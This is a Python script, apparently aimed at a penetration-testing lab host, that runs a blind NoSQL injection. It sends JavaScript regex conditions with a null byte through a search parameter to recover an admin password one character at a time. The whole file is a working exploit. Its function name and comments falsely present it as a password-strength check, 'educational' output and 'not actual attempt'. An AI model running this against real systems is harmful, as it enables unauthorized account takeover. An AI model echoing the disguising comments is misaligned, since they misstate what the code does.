import urllib.request
import string

# Placeholder URL (replace with a safe, non-vulnerable site)
URL = "http://ptl-6851e077-185cea58.libcurl.so"  # This URL will not be used for any malicious checks

def check_password_strength(payload):

    url = URL + "/?search=admin%27%26%26this.password.match(/" + payload + "/)%00"
    print(url)  # Print the constructed URL for educational purposes

    resp = urllib.request.urlopen(url)

    data = resp.read() 
    return ">admin<" in str(data)


CHARSET = list("-~" + string.ascii_lowercase + string.digits)
password = ""

while True:
    for c in CHARSET:
        print("Trying: " + c + " for " + password)
        test = password + c
        if check_password_strength("^" + test + ".*$"):  # Example pattern, not actual attempt
            password += c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            exit(0)
